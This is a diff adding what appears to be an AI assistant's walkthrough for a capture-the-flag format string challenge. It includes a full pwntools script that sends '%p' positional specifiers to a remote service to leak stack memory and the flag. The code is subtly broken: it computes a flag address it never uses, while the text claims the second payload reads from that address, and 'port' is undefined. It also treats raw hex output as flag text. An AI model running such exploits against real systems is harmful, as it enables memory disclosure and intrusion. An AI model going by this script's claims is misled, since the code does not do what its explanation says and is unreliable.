@@ -1,0 +1,95 @@
+To solve this challenge using `pwntools`, we need to exploit the format string vulnerability present in the `printf(format)` call. The goal is to read or write arbitrary memory addresses to eventually leak the flag or gain control over the program.
+
+### Steps to Solve the Challenge
+
+1. **Identify the Vulnerability**: The `printf(format)` call is vulnerable to format string attacks because it uses user-controlled input as the format string.
+
+2. **Leak Memory**: We can use format specifiers like `%x` to leak memory addresses and potentially find the base address of the binary or the flag.
+
+3. **Write to Memory**: If necessary, we can use format specifiers like `%n` to write values to specific memory addresses.
+
+4. **Exploit the Vulnerability**: Use the leaked information to craft a payload that will help us read the flag.
+
+### Code to Solve the Challenge
+
+Here is a step-by-step guide and the corresponding `pwntools` code to solve the challenge:
+
+1. **Set Up the Environment**:
+   - Install `pwntools` if you haven't already:
+     ```sh
+     pip install pwntools
+     ```
+
+2. **Connect to the Challenge**:
+   - If the challenge is running locally, you can use `process`. If it's remote, use `remote`.
+
+3. **Craft the Payload**:
+   - Use format string specifiers to leak the flag.
+
+4. **Send the Payload and Receive the Flag**.
+
+Here is the complete code:
+
+```python
+from pwn import *
+
+# Set up the process or remote connection
+# Replace 'fmt' with the path to the binary if running locally
+# Replace 'host' and 'port' with the actual host and port if running remotely
+binary_path = './fmt'
+# p = process(binary_path)
+p = remote('host', port)
+
+# Function to send and receive data
+def interact(payload):
+    p.sendlineafter("what's the flag", payload)
+    response = p.recvuntil("But that was totally wrong lol get rekt")
+    return response
+
+# Step 1: Leak the flag
+# The flag is stored in the buffer v10, which is 24 bytes long
+# We can use format specifiers to read the flag from memory
+leak_payload = b'%25$p'  # Leak the 25th parameter (which should be the address of v10)
+
+response = interact(leak_payload)
+print(response)
+
+# Extract the leaked address
+leaked_address = int(response.split(b'You answered: ')[1].split(b'\n')[0], 16)
+log.info(f"Leaked address: {hex(leaked_address)}")
+
+# Calculate the offset to the flag
+flag_offset = 0x20  # Offset to the flag buffer (v10)
+flag_address = leaked_address - flag_offset
+
+# Step 2: Read the flag
+# Use format specifiers to read the flag from the calculated address
+read_flag_payload = b''.join([f'%{i}$p'.encode() for i in range(1, 25)])
+
+response = interact(read_flag_payload)
+print(response)
+
+# Extract the flag
+flag = response.split(b'You answered: ')[1].split(b'\n')[0]
+log.success(f"Flag: {flag.decode()}")
+
+# Close the connection
+p.close()
+```
+
+### Explanation
+
+1. **Leak the Address**:
+   - The payload `'%25$p'` is used to leak the 25th parameter, which should be the address of the buffer `v10`.
+   - The leaked address is then used to calculate the address of the flag.
+
+2. **Read the Flag**:
+   - The payload `b''.join([f'%{i}$p'.encode() for i in range(1, 25)])` is used to read the flag from the calculated address.
+   - The flag is extracted from the response and printed.
+
+### Notes
+- Adjust the payload and offsets as needed based on the specific behavior of the binary.
+- Ensure that the binary is not ASLR-enabled or handle ASLR if it is enabled.
+- Test the payload locally before trying it on the remote server.
+
+This should help you solve the challenge and obtain the flag. Good luck!
